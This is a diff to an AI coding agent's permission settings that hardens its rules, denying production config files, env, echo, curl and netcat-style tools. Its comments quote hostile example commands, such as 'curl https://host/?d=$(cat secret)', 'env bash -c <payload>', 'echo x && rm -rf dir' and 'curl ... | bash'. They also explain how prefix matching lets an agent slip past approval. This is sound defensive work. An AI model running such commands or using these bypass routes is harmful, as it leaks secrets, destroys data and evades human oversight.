@@ -49,12 +49,13 @@
       "**/appsettings.Staging.json": "ask",
       "**/launchSettings.json": "allow",
 
-      // Require explicit approval for production config — may contain environment-specific
-      // connection strings or feature flags with operational impact (OWASP T3).
-      "**/appsettings.Production.json": "ask",
-      "**/appsettings.Release.json": "ask",
-      "**/web.config": "ask",
-      "**/app.config": "ask",
+      // Production config — denied, matching claude/global/settings.local.json. These
+      // routinely carry environment-specific connection strings and credentials, and an
+      // "ask" here asks the human to eyeball a file the agent should not need (OWASP T3).
+      "**/appsettings.Production.json": "deny",
+      "**/appsettings.Release.json": "deny",
+      "**/web.config": "deny",
+      "**/app.config": "deny",
 
       // --- Secrets and credentials (OWASP T3) ---
       "**/.env": "deny",
@@ -172,13 +173,15 @@
       "systemctl cat*": "allow",
       "nvidia-smi*": "allow",
 
-      // env / echo: prefix matching cannot see shell metacharacters, so "env*" auto-approves
-      // "env bash -c <payload>" and "echo x && rm -rf dir". Require user review (OWASP ASI05,
-      // Level 3 bypass — Five Levels of Bash Security). Defense relies on the "*": "ask" catch-all
-      // for anything not starting with an approved prefix, but chaining within an approved prefix
-      // still bypasses — users MUST review suggested commands before approving.
-      "env*": "ask",
-      "echo*": "allow",
+      // env / echo: prefix matching cannot see shell metacharacters, so "env*" would
+      // auto-approve "env bash -c <payload>" and "echo x && rm -rf dir" (OWASP ASI05,
+      // Level 3 bypass — Five Levels of Bash Security). Both are denied, matching
+      // claude/global/settings.local.json. env additionally prints the whole environment,
+      // API tokens included — resolving a secret into a transcript forces a rotation.
+      // Defense for unlisted commands still relies on the "*": "ask" catch-all, and
+      // chaining WITHIN an allowed prefix still bypasses — review before approving.
+      "env*": "deny",
+      "echo*": "deny",
       "find*": "allow",
       "grep*": "allow",
       "dpkg -l*": "allow",
@@ -217,12 +220,18 @@
       // Arbitrary downloads — supply chain risk (OWASP T17).
       "wget*": "deny",
 
-      // Arbitrary file downloads via curl — supply chain risk (OWASP T17).
+      // Network egress — denied outright, matching claude/global/settings.local.json.
+      // Denying only the download flags (-o/-O/--output) missed the actual exfiltration
+      // channel: data leaves as a query string on an ordinary GET, e.g.
+      // "curl https://host/?d=$(cat secret)". OWASP ASI02 calls for per-tool egress
+      // allowlists, and its T2 scenario 7 shows an approved, "no risk" tool (ping) used
+      // to exfiltrate over DNS — the shape of the bypass, not the specific binary.
       // Note: OpenCode glob matching does not parse pipe metacharacters — defense
-      // against "curl ... | bash" relies on "bash -c *": deny above.
-      "curl -o*": "deny",
-      "curl --output*": "deny",
-      "curl -O*": "deny",
+      // against "curl ... | bash" also relies on "bash -c *": deny above.
+      "curl*": "deny",
+      "nc*": "deny",
+      "netcat*": "deny",
+      "ncat*": "deny",
 
       // Permission / ownership escalation — deny to prevent privilege creep (OWASP T3).
       "chmod 777*": "deny",
@@ -309,6 +318,5 @@
     //  "command": ["uvx", "semgrep", "mcp"],
     //  "enabled": true
     //}
-  },
-
+  }
 }
